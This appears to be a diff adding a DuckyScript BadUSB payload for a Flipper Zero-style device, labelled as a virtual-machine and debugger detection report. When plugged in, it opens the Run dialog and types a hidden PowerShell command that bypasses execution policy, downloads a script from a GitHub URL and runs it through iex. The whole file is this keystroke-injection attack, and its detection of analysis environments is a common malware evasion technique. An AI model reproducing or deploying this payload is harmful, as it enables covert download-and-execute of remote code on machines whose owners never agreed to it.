@@ -1,0 +1,15 @@
+REM Title: VM-Detection-Report
+REM Author: @beigeworm
+REM Description: Uses various methods to determine if the machine is a VM or if debugging or system monitoring software is running.
+REM Description: Will generate a console readout and verbose text file
+REM Target: Windows 10
+
+REM some setup for dukie script
+DEFAULT_DELAY 100
+
+REM open powershell (remove "-W H" to show the window)
+DELAY 1000
+GUI r
+DELAY 750
+STRING powershell -NoP -Ep Bypass -W H -C irm https://raw.githubusercontent.com/beigeworm/BadUSB-Files-For-FlipperZero/main/VM-Detection-Report/main.ps1 | iex
+ENTER
